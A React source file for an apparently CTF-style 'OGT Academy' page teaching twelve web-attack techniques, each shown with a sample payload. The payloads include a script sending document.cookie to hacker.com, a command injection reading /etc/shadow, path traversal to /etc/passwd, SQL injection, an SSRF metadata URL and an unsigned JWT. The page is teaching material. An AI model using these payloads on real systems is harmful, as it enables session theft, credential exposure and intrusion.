
import React, { useState } from 'react';
import { BookOpen, Code, Terminal, Zap, Shield, ChevronRight, Eye, Globe, Database, Search, AlertCircle, Lock, Cpu, Server, FileCode, Layers, Key, Share2, Activity, User as UserIcon, ArrowUpRight, ShoppingCart } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const CookieIcon = ({ size, className }: { size: number, className?: string }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
    <path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5" />
    <path d="M8.5 8.5v.01" /><path d="M16 15.5v.01" /><path d="M12 12v.01" /><path d="M11 17v.01" /><path d="M7 14v.01" />
  </svg>
);

const ACADEMY_MODULES = [
  {
    id: 'recon',
    title: 'Module 1: Passive Reconnaissance',
    desc: 'The art of silent information gathering.',
    icon: Search,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Before a single packet is sent to an exploit, a hacker must understand the surface. Passive reconnaissance is finding information the developers didn't realize they were exposing.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Eye size={16} className="mr-2 text-blue-400" /> The "Why" of View Source</h4>
          <p className="text-sm text-slate-400 mb-4">
            Developers often use comments (&lt;!-- --&gt;) for internal notes. These notes can contain legacy URLs, credentials, or logic hints.
            <br/><br/>
            <span className="text-violet-400 font-bold">Hackers do this because</span> browsers deliver the *entire* HTML/JS bundle to the user. Even if a feature is hidden in the UI, the code for it usually still exists in the source.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] text-emerald-400/80">
            <div>&lt;!-- DEBUG_MODE: Enabled --&gt;</div>
            <div className="text-slate-700">&lt;!-- TODO: Remove hardcoded admin bypass before v1.0 --&gt;</div>
            <div>&lt;script src="/api/v1/internal_auth.js"&gt;&lt;/script&gt;</div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'robots',
    title: 'Module 2: The Robots Agreement',
    desc: 'Using crawler directives as a treasure map.',
    icon: Globe,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          The <code className="text-violet-300">robots.txt</code> file is a set of instructions for search engine crawlers (like Googlebot).
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Lock size={16} className="mr-2 text-emerald-400" /> Why Check Robots?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Developers use "Disallow" to hide sensitive pages from Google. However, this is NOT a security measure. It's a "gentleman's agreement."
            <br/><br/>
            <span className="text-violet-400 font-bold">Hackers do this because</span> "Disallow" literally lists the folders the owner doesn't want you to find. It’s like a sign on a door saying "Don't look in this secret safe."
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] text-blue-400">
            <div>User-agent: *</div>
            <div className="text-red-400">Disallow: /admin_panel_deprecated/</div>
            <div className="text-red-400">Disallow: /sql_backups/</div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'sqli',
    title: 'Module 3: SQL Injection Basics',
    desc: 'Manipulating the database logic via input.',
    icon: Database,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          SQLi is the process of tricking the database into executing your own commands instead of the ones the developer intended.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Zap size={16} className="mr-2 text-violet-400" /> Why use ' OR 1=1 -- ?</h4>
          <p className="text-sm text-slate-400 mb-4">
            If a query is built like this: <code className="text-slate-500">SELECT * FROM users WHERE pass='$pass'</code>, entering <code className="text-violet-400">' OR 1=1 --</code> changes it.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Logic:</span> 1=1 is always true. In computer logic, "A OR True" is always True. By using <code className="text-violet-300">--</code>, we tell the database to ignore the rest of the developer's original code. This forces a "Success" result regardless of the password.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] text-emerald-500">
            SELECT * FROM users WHERE pass='' OR 1=1 <span className="text-slate-600">-- '</span>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'xss',
    title: 'Module 4: Cross-Site Scripting (XSS)',
    desc: 'Injecting code into other users\' browsers.',
    icon: AlertCircle,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          XSS is an attack where "bad" JavaScript is injected into a trusted website.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Cpu size={16} className="mr-2 text-emerald-400" /> Why is XSS Dangerous?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Browsers trust the code sent by a website. If you can force a site to send your script, the victim's browser thinks it's official.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Goal:</span> We use <code className="text-violet-300">{"<script>alert(1)</script>"}</code> as a proof of concept. If the alert pops, it means we can also run scripts that steal cookies or redirect the user.
          </p>
          <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl font-mono text-xs text-emerald-400 italic">
            {"<script>document.location='http://hacker.com/steal?cookie=' + document.cookie</script>"}
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'idor',
    title: 'Module 5: IDOR Exploitation',
    desc: 'Accessing resources by changing numeric IDs.',
    icon: UserIcon,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Insecure Direct Object Reference (IDOR) is a vulnerability where an app provides direct access to objects based on user-supplied input.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><ArrowUpRight size={16} className="mr-2 text-blue-400" /> Why change /user/10 to /user/1?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Developers often use database IDs directly in the URL (e.g., <code className="text-violet-300">/view_invoice/55</code>).
            <br/><br/>
            <span className="text-violet-400 font-bold">The Vulnerability:</span> If the server doesn't check if *You* are allowed to see invoice #54, you can simply change the number. ID #1 is almost always the admin or the first system account created.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex items-center space-x-2 text-xs font-mono">
            <span className="text-slate-500">GET</span>
            <span className="text-white">/api/v1/profile/</span>
            <span className="text-emerald-500 font-bold">1</span>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'traversal',
    title: 'Module 6: Path Traversal',
    desc: 'Escaping the web root to find OS files.',
    icon: FileCode,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Path Traversal (or Directory Traversal) involves using <code className="text-violet-300">../</code> sequences to navigate out of the intended folder.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Layers size={16} className="mr-2 text-amber-400" /> Why use ../../../../etc/passwd?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Web servers are usually locked in a folder like <code className="text-slate-500">/var/www/html</code>. If an app takes a filename as input, we try to go "up" to the system root.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Target:</span> On Linux, <code className="text-violet-300">/etc/passwd</code> lists all users and is a standard way to prove you have escaped the web sandbox.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs text-amber-500">
            ?view=../../../../../../etc/passwd
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'cookies',
    title: 'Module 7: Cookie Forgery',
    desc: 'Manipulating session tokens for privilege escalation.',
    icon: CookieIcon,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Cookies are small pieces of data stored in your browser to keep you logged in.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Shield size={16} className="mr-2 text-violet-400" /> Why edit Cookies?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Many simple sites store the "role" directly in the cookie without encrypting it.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Exploit:</span> If you see <code className="text-violet-300">admin=false</code> in your DevTools, changing it to <code className="text-violet-300">true</code> and refreshing might trick the server into thinking you are the admin.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] text-violet-400">
            Set-Cookie: user_role=admin; Path=/; Secure;
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'rce',
    title: 'Module 8: Command Injection',
    desc: 'Executing OS commands on the server.',
    icon: Terminal,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Command Injection happens when an app passes user input directly to a system shell (like bash or cmd).
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Activity size={16} className="mr-2 text-red-500" /> Why use the semicolon (;)?</h4>
          <p className="text-sm text-slate-400 mb-4">
            In Linux, the <code className="text-violet-300">;</code> character allows you to run multiple commands on one line.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Attack:</span> If a site pings an IP using <code className="text-slate-500">ping [INPUT]</code>, sending <code className="text-violet-300">8.8.8.8; ls</code> will ping Google and then immediately list all files in the current folder.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs text-red-400">
            $ ping 127.0.0.1; cat /etc/shadow
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'ssti',
    title: 'Module 9: Template Injection (SSTI)',
    desc: 'Breaking out of web templates.',
    icon: Server,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          SSTI occurs when an application embeds user input into templates (like Jinja2 or Mako) insecurely.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Cpu size={16} className="mr-2 text-violet-400" /> Why test with {"{{7*7}}"}?</h4>
          <p className="text-sm text-slate-400 mb-4">
            {"The expression "}<code className="text-violet-300">{"{{7*7}}"}</code>{" is a universal test for template engines."}
            <br/><br/>
            <span className="text-violet-400 font-bold">The Reason:</span>{" If the website displays \"Hello, 49\" instead of \"Hello, {{7*7}}\", it means the server is *calculating* your input as code. From here, you can use specialized payloads to read server memory or execute code."}
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs text-blue-400">
            {"{{ self.__dict__ }}"}
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'jwt',
    title: 'Module 10: JWT Vulnerabilities',
    desc: 'Attacking JSON Web Tokens.',
    icon: Key,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          JWTs are used for modern authentication. They have three parts: Header, Payload, and Signature.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Lock size={16} className="mr-2 text-violet-500" /> Why use "None" Algorithm?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Early JWT implementations allowed you to change the header to <code className="text-violet-300">"alg": "None"</code>.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Exploit:</span> If the server accepts "None", it stops checking the signature. You can then change your username to "admin" in the payload part and the server will believe you without a password.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[10px] space-y-1">
             <div className="text-red-400">{'{"alg":"None","typ":"JWT"}'}</div>
             <div className="text-violet-400">{'{"user":"admin","admin":true}'}</div>
             <div className="text-slate-600">(Empty Signature)</div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'ssrf',
    title: 'Module 11: SSRF Attacks',
    desc: 'Forcing the server to make requests for you.',
    icon: Share2,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Server-Side Request Forgery (SSRF) tricks a server into visiting internal URLs that are not accessible from the outside.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Server size={16} className="mr-2 text-emerald-400" /> Why target 127.0.0.1?</h4>
          <p className="text-sm text-slate-400 mb-4">
            Servers often have internal admin panels that only work if you are sitting at the server itself (<code className="text-violet-300">localhost</code>).
            <br/><br/>
            <span className="text-violet-400 font-bold">The Strategy:</span> If a site has a "Fetch URL" feature, we tell it to fetch <code className="text-violet-300">http://localhost/admin</code>. The server fetches it from itself and shows the results to us!
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-xs text-emerald-500">
            ?url=http://169.254.169.254/latest/meta-data/
          </div>
        </div>
      </div>
    )
  },
  {
    id: 'logic',
    title: 'Module 12: Business Logic Flaws',
    desc: 'Abusing the rules of the application.',
    icon: ShoppingCart,
    content: (
      <div className="space-y-6">
        <p className="text-slate-400 leading-relaxed">
          Logic flaws aren't coding errors; they are flaws in the *design* of the app.
        </p>
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
          <h4 className="font-bold text-white flex items-center mb-4"><Lock size={16} className="mr-2 text-violet-400" /> Why try negative quantities?</h4>
          <p className="text-sm text-slate-400 mb-4">
            In an e-commerce app, if you add <code className="text-violet-300">-1</code> items to your cart, a poorly designed system might subtract the price from your total.
            <br/><br/>
            <span className="text-violet-400 font-bold">The Outcome:</span> You could potentially "buy" something and end up with a higher balance than you started with, or get expensive items for free by balancing them with negative quantities.
          </p>
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 font-mono text-[11px] flex justify-between">
            <span className="text-slate-500">Cart Update:</span>
            <span className="text-red-400">item_id: 1, quantity: -100</span>
          </div>
        </div>
      </div>
    )
  }
];

const Academy: React.FC = () => {
  const [activeModule, setActiveModule] = useState(ACADEMY_MODULES[0]);

  return (
    <div className="p-8 space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-500 max-w-6xl mx-auto">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-6 mb-12">
        <div className="max-w-2xl">
          <span className="px-3 py-1 bg-violet-600/10 text-violet-400 text-[10px] font-black uppercase tracking-[0.2em] rounded-lg border border-violet-500/20 mb-4 inline-block italic">
            Knowledge Node v1
          </span>
          <h1 className="text-5xl font-black text-white italic tracking-tighter uppercase mb-3">OGT Academy</h1>
          <p className="text-slate-400 font-medium">Training modules designed to evolve your security mindset. Master the protocols, bypass the defenses, and clear the nexus.</p>
        </div>
        <div className="bg-slate-900 border border-slate-800 p-6 rounded-[2rem] flex items-center space-x-6 shadow-2xl">
           <div className="text-right">
              <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Knowledge Rank</div>
              <div className="text-xl font-black text-white italic">Adept Solver</div>
           </div>
           <div className="w-12 h-12 rounded-2xl bg-violet-600 flex items-center justify-center text-white shadow-xl shadow-violet-600/20">
              <BookOpen size={24} />
           </div>
        </div>
      </div>

      <div className="grid lg:grid-cols-12 gap-10">
        <div className="lg:col-span-4 space-y-3 max-h-[700px] overflow-y-auto pr-2 custom-scrollbar">
           <h3 className="text-[10px] font-black text-slate-600 uppercase tracking-[0.3em] mb-4 px-2 italic sticky top-0 bg-slate-950 py-2 z-10">Operation Modules</h3>
           {ACADEMY_MODULES.map(module => {
             const Icon = module.icon;
             const isActive = activeModule.id === module.id;
             return (
               <motion.button
                 key={module.id}
                 whileTap={{ scale: 0.98 }}
                 onClick={() => setActiveModule(module)}
                 className={`w-full flex items-center p-4 rounded-[1.8rem] border transition-all text-left group ${
                   isActive 
                     ? 'bg-violet-600 border-violet-500 shadow-2xl shadow-violet-600/20 scale-[1.02]' 
                     : 'bg-slate-900/50 border-slate-800 hover:border-slate-700'
                 }`}
               >
                 <div className={`w-10 h-10 rounded-xl flex items-center justify-center mr-4 transition-colors ${
                   isActive ? 'bg-white/20 text-white' : 'bg-slate-800 text-slate-500 group-hover:text-violet-400'
                 }`}>
                   <Icon size={18} />
                 </div>
                 <div className="flex-1">
                   <div className={`text-xs font-black uppercase italic tracking-tighter mb-0.5 ${isActive ? 'text-white' : 'text-slate-300'}`}>
                     {module.title}
                   </div>
                   <div className={`text-[9px] line-clamp-1 font-medium ${isActive ? 'text-violet-200' : 'text-slate-500'}`}>
                     {module.desc}
                   </div>
                 </div>
                 <ChevronRight className={isActive ? 'text-white' : 'text-slate-700'} size={14} />
               </motion.button>
             );
           })}

           <div className="mt-8 p-6 bg-gradient-to-br from-slate-900 to-slate-950 border border-slate-800 rounded-[2.5rem] shadow-inner relative overflow-hidden">
              <Zap className="text-violet-500/10 absolute -top-4 -right-4" size={100} />
              <h4 className="text-white font-black italic uppercase text-xs mb-3 relative z-10">Pro Tip</h4>
              <p className="text-[10px] text-slate-400 leading-relaxed font-medium relative z-10 italic">
                "Always check the URL parameters first. If it looks like a variable, someone is probably using it insecurely."
              </p>
           </div>
        </div>

        <div className="lg:col-span-8">
           <AnimatePresence mode="wait">
             <motion.div
               key={activeModule.id}
               initial={{ opacity: 0, y: 20 }}
               animate={{ opacity: 1, y: 0 }}
               exit={{ opacity: 0, y: -20 }}
               className="bg-slate-900 border border-slate-800 rounded-[3rem] p-8 shadow-2xl h-full flex flex-col min-h-[500px]"
             >
                <div className="flex items-center space-x-6 mb-8 pb-8 border-b border-slate-800">
                   <div className="w-16 h-16 rounded-2xl bg-slate-950 border border-slate-800 flex items-center justify-center">
                      <activeModule.icon size={32} className="text-violet-500" />
                   </div>
                   <div>
                      <h2 className="text-2xl font-black italic uppercase tracking-tighter text-white mb-1">{activeModule.title}</h2>
                      <div className="flex items-center space-x-3">
                         <span className="text-[9px] font-black text-slate-600 uppercase tracking-widest">Protocol v1.0</span>
                         <span className="text-[9px] font-black text-violet-400 uppercase tracking-widest bg-violet-600/10 px-2 py-0.5 rounded">Core Learning</span>
                      </div>
                   </div>
                </div>

                <div className="flex-1 overflow-y-auto custom-scrollbar pr-2">
                   {activeModule.content}
                </div>

                <div className="mt-8 flex justify-between items-center pt-6 border-t border-slate-800">
                   <div className="flex items-center space-x-2 text-[9px] font-black uppercase text-slate-600 tracking-widest italic">
                      <Code size={12} />
                      <span>OGT Academy v1</span>
                   </div>
                </div>
             </motion.div>
           </AnimatePresence>
        </div>
      </div>
      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #8b5cf6; }
      `}</style>
    </div>
  );
};

export default Academy;
